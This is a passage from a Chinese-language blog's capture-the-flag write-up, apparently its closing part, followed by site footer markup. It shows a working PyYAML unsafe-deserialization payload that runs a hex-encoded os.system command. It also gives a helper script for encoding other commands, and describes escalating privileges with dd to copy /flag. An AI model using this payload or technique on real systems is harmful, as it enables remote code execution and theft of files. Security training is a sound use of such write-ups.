+<p>此时成功控制了写入文件的内容</p>
+<p>之后便是yaml反序列化，参考：</p>
+<p><a href="https://hackmd.io/@harrier/uiuctf20">https://hackmd.io/@harrier/uiuctf20</a></p>
+<p>我们将payload稍作修改：</p>
+<p>需要注意的是rce后发现权限不够，find一下高权限发现dd命令，用dd提权</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>dirs: [<span style="color:#5af78e">&#39;&#39;</span>]
+</span></span><span style="display:flex;"><span>filename: snakin
+</span></span><span style="display:flex;"><span>files:
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">-</span> <span style="color:#ff5c57">!!</span>python<span style="color:#ff6ac1">/</span><span style="color:#ff5c57">object</span><span style="color:#ff6ac1">/</span>new:yaml<span style="color:#ff6ac1">.</span>MappingNode
+</span></span><span style="display:flex;"><span>  listitems: <span style="color:#ff5c57">!!</span><span style="color:#ff5c57">str</span> <span style="color:#5af78e">&#34;!!python/object/new:eval  [ </span><span style="color:#5af78e">\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x64\x64\x20\x69\x66\x3d\x2f\x66\x6c\x61\x67\x20\x6f\x66\x3d\x2f\x74\x6d\x70\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74\x20\x3e\x20\x2f\x74\x6d\x70\x2f\x63\x2e\x74\x78\x74\x27\x29</span><span style="color:#5af78e"> ]&#34;</span>
+</span></span><span style="display:flex;"><span>  state:
+</span></span><span style="display:flex;"><span>    tag: <span style="color:#ff5c57">!!</span><span style="color:#ff5c57">str</span> dummy
+</span></span><span style="display:flex;"><span>    value: <span style="color:#ff5c57">!!</span><span style="color:#ff5c57">str</span> dummy
+</span></span><span style="display:flex;"><span>    extend: <span style="color:#ff5c57">!!</span>python<span style="color:#ff6ac1">/</span>name:yaml<span style="color:#ff6ac1">.</span>unsafe_load
+</span></span></code></pre></div><p>可以通过以下脚本更换命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>byte_var <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;__import__(&#39;os&#39;).system(&#39;dd if=/flag of=/tmp/flag.txt &gt; /tmp/snakin.txt&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">for</span> i <span style="color:#ff6ac1">in</span> byte_var:
+</span></span><span style="display:flex;"><span>    i <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">hex</span>(i)
+</span></span><span style="display:flex;"><span>    i <span style="color:#ff6ac1">=</span> i<span style="color:#ff6ac1">.</span>replace(<span style="color:#5af78e">&#34;0&#34;</span>, <span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\\</span><span style="color:#5af78e">&#34;</span>,<span style="color:#ff9f43">1</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(i,end<span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;&#34;</span>)
+</span></span></code></pre></div><p>最后利用最开始的目录穿越读我们写入tmp的flag文件</p>
+<p><img alt="image-20220826162918144" src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220826162918144.png"></p>
+
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+          </div>
+        </div>
+        
+          <div class="row">
+            <div class="col-xs-12">
+              
+            </div>
+          </div>
+
+          
+
+
+
+          
+          
+          <div style="height: 50px;"></div>
+          
+        
+        <div class="site-footer">
+  
+  
+
+  
+    <script src="/js/clipboard.js"></script>
+  
+
+  
+  
+
+    
+      
+      
+      <div class="site-footer">
+        <div class="busuanzi-footer">
+          <span id="busuanzi_container_site_pv">
+            本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+          </span>
+          <span class="separator">|</span> 
+          <span id="busuanzi_container_site_uv">
+            本站访客数 <span id="busuanzi_value_site_uv"></span> 人次
+          </span>
+        </div>
+        <p class="footer-beian"> 
+          <a href="https://beian.miit.gov.cn/" target="_blank" rel="noopener noreferrer">
+            蜀ICP备2021024344号-1
+          </a>
+        </p>
+      </div>
+
+      
+    </div>
+      </div>
+    </div>
+  </article>
+
+  
+
+<script>
+  
+  
+    
+    
+  
+</script>
+
+  
+
+</body>
+
+</html>
